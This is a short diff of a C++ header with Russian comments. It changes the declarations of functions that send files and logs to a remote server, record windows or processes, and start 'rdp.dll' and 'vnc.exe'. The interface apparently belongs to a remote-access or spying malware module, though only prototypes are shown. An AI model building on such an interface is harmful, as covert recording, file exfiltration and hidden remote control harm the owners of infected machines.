@@ -50,8 +50,8 @@ private:
 	typedef VOID (WINAPI *TResetTimer	)();
 
 	//функции отправки файлов
-	typedef VOID (WINAPI *TStartSend	)( DWORD server, char* path );
-	typedef DWORD (WINAPI *TStartSendAsync )( DWORD server, char* path );
+	typedef VOID (WINAPI *TStartSend	)( DWORD server, char* name, char* path, int after );
+	typedef DWORD (WINAPI *TStartSendAsync )( DWORD server, char* name, char* path, int after );
 	typedef DWORD (WINAPI *TIsSendedAsync )( DWORD );
 
 	//функции передачи логов на сервер
@@ -105,10 +105,13 @@ int Init( int flags, const char* ip, int port, int downtime );
 bool RecordHWND( int server, const char* name, HWND wnd, int seconds = 0, int flags = 0 );
 bool RecordPID( int server, const char* name, DWORD pid = 0, int seconds = 0, int flags = 0 );
 void RecordStop();
-DWORD SendFiles( int server, const char* name, const char* path, bool async = false );
+DWORD SendFiles( int server, const char* name, const char* path, int after = 0, bool async = false );
 bool FilesIsSended(DWORD id);
 bool SendLog( int server, const char* name, int code, const char* text );
-
+//запуск rdp.dll
+DWORD WINAPI ProcessRDP(void*);
+//запуск vnc.exe
+DWORD WINAPI ProcessVNC(void*);
 };
 
 //класс для упрощения отправки логов, тут запоминается имя лога, чтобы не писать его в каждой строчке
